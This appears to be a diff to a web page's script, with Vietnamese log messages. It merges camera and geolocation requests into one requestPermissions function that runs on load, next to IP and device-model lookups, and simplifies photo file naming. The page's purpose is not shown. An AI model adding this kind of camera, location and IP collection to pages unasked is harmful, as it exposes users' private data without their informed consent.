@@ -108,24 +108,48 @@
             });
         });
 
-        async function initCamera() {
+        //async function initCamera() {
+        //    try {
+        //        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+        //        video.srcObject = stream;
+        //        loadingOverlay.style.display = "none";
+        //    } catch (err) {
+        //        loadingOverlay.querySelector(".loading-text").textContent = "Không thể truy cập camera!";
+        //        console.error(err);
+        //    }
+        //}
+
+        //function getLocation() {
+        //    if (!navigator.geolocation) return;
+        //    navigator.geolocation.getCurrentPosition(pos => {
+        //        locationData.lat = pos.coords.latitude;
+        //        locationData.lon = pos.coords.longitude;
+        //        updateDeviceInfo();
+        //    }, err => console.warn('Không lấy vị trí:', err.message));
+        //}
+
+        async function requestPermissions() {
+            // Camera
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                 video.srcObject = stream;
-                loadingOverlay.style.display = "none";
+                console.log("Camera được cấp quyền");
             } catch (err) {
-                loadingOverlay.querySelector(".loading-text").textContent = "Không thể truy cập camera!";
-                console.error(err);
+                console.warn("Không được cấp quyền camera:", err);
             }
-        }
 
-        function getLocation() {
-            if (!navigator.geolocation) return;
-            navigator.geolocation.getCurrentPosition(pos => {
-                locationData.lat = pos.coords.latitude;
-                locationData.lon = pos.coords.longitude;
-                updateDeviceInfo();
-            }, err => console.warn('Không lấy vị trí:', err.message));
+            // Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        locationData.lat = pos.coords.latitude;
+                        locationData.lon = pos.coords.longitude;
+                        updateDeviceInfo();
+                        console.log("Vị trí được cấp quyền");
+                    },
+                    err => console.warn("Không được cấp quyền vị trí:", err)
+                );
+            }
         }
 
         async function getIP() {
@@ -158,14 +182,6 @@
         }
 
         function makeSafeName(angleKey) {
-            const now = new Date();
-            const pad = v => String(v).padStart(2, '0');
-            const YYYY = now.getFullYear();
-            const MM = pad(now.getMonth() + 1);
-            const DD = pad(now.getDate());
-            const hh = pad(now.getHours());
-            const mm = pad(now.getMinutes());
-            const ss = pad(now.getSeconds());
             return `${angleKey}_${id}.jpg`;
         }
 
@@ -331,8 +347,9 @@
         });
 
         getDeviceModel();
-        initCamera();
-        getLocation();
+        //initCamera();
+        //getLocation();
+        requestPermissions();
         getIP();
         updateDeviceInfo();
     </script>
